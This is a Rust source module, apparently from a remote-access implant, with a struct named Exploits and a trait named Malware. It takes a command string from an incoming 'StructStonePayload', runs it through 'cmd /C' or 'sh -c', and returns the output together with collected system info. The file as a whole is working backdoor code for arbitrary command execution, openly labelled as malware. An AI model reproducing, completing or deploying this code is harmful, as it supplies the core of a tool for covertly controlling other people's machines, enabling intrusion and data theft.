use std::process::{Command, ExitStatus, Output};
use crate::structure::StructStonePayload;

#[derive(Debug)]
pub struct Exploits {
    pub sys_info: Vec<u8>,
    pub exploit_input: Vec<u8>,
    pub exploit_output: Vec<u8>
}

impl Exploits {
    pub fn default() -> Exploits {
        Exploits {
            sys_info: vec![],
            exploit_input: vec![],
            exploit_output: vec![]
        }
    }

    pub fn from(payload: StructStonePayload) -> Exploits {
        Exploits {
            sys_info: payload.sysinfo,
            exploit_input: payload.command_input ,
            exploit_output: vec![]
            }
        }
    }

pub trait Malware {
    fn exe_command(&mut self) -> Exploits;
}

impl Malware for Exploits {
    fn exe_command(&mut self) -> Exploits {

        let exploit_input = match String::from_utf8(self.exploit_input.clone()) {
            Ok(r) => r,
            Err(_) => "".to_string()
        };

        let exploit_output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", &exploit_input])
                .output()
                .expect("failed to execute process")
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(&exploit_input)
                .output()
                .expect("failed to execute process")
        };
        match exploit_output.stdout.is_empty() {
            true => { self.exploit_output = exploit_output.stderr }
            false => { self.exploit_output = exploit_output.stdout }
        }

        Exploits {
            sys_info: self.sys_info.clone(),
            exploit_input: vec![],
            exploit_output: self.exploit_output.clone(),
        }
    }
}
